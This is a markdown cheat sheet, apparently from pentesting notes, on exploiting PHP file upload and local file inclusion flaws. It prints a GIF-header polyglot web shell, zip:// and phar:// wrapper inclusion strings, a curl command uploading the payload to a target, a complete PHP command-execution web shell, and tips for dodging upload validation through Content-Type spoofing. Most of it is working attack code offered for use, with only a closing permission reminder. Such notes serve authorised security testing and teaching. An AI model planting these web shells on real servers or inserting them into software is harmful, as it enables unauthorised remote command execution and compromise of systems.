```markdown
# 🖥️ File Upload + LFI - Malicious Images (GIF8\<?php system($\_GET["cmd"]); ?>), Zip (zip://file.jpg#shell.php), Phar (phar://file.jpg/shell.txt)

> [!ABSTRACT] Overview
> This document details the process of exploiting file upload vulnerabilities and Local File Inclusion (LFI) to deploy malicious images, zip files, and phar archives that can execute system commands via PHP.

---

## 🖼️ Malicious Images

### GIF8 with Inline PHP Code
Use a GIF image header followed by inline PHP code to create an executable payload:

```php
GIF8<?php system($_GET["cmd"]); ?>
```

> [!NOTE]
> The payload is embedded within the GIF file's binary data. Ensure that this payload bypasses any server-side validation.

---

## 📦 Zip File Exploitation

### Embedded PHP Shell in ZIP Archive
Embed a PHP shell script inside an image file to deliver and execute it via a zip archive:

```php
zip://file.jpg#shell.php
```

> [!WARNING]
> This technique is highly dependent on the server's configuration allowing execution of files within zipped archives.

---

## 📦 Phar Archive Exploitation

### Embedding Shell Script in Phar Archive
Embed a shell script within an image file to deliver it via a Phar archive:

```php
phar://file.jpg/shell.txt
```

> [!DANGER]
> This method may trigger security mechanisms designed to prevent the execution of arbitrary files from PHAR archives.

---

## 🚀 Exploitation Workflow

### Initial File Upload
Upload the crafted malicious image or zip/phar archive to a vulnerable file upload endpoint:

```bash
curl -F "file=@payload.gif" http://target/upload.php
```

> [!SUCCESS]
> If successful, the uploaded file should be accessible via a predictable URL.

---

## 🛠️ Crafting Payloads

### Example PHP Shell Script (shell.php)
Create an executable PHP shell script to be embedded within the image or archive:

```php
<?php 
echo 'Executing command: '.$_GET['cmd'].'<br/>';
system($_GET["cmd"]);
?>
```

> [!EXAMPLE]
> This example demonstrates how a simple PHP script can be used to execute arbitrary commands via GET parameters.

---

## 🚧 Potential Issues

### Server-Side Validation
Many web applications enforce strict validation on uploaded files, such as checking file extensions or MIME types:

```text
Allowed Extensions: gif, jpg, png, jpeg
```

> [!FAILURE]
> If the server has strict validation rules in place, this method will not work unless bypasses are found.

---

## 🧑‍💻 Exploitation Tips

### Bypassing Validation Rules
To bypass file upload validation, consider using techniques like:

- **Content-Type Spoofing**: Modify the Content-Type header to pass through filters.
- **MIME Type Manipulation**: Use valid but uncommon MIME types that still allow execution.

---

## 📜 Summary

This document outlines methods for exploiting file upload vulnerabilities and LFI issues by embedding PHP code within images, zip files, or phar archives. Successful exploitation requires careful crafting of payloads to bypass server-side security measures.

> [!NOTE]
> Always ensure you have permission before testing any web application for vulnerabilities.
```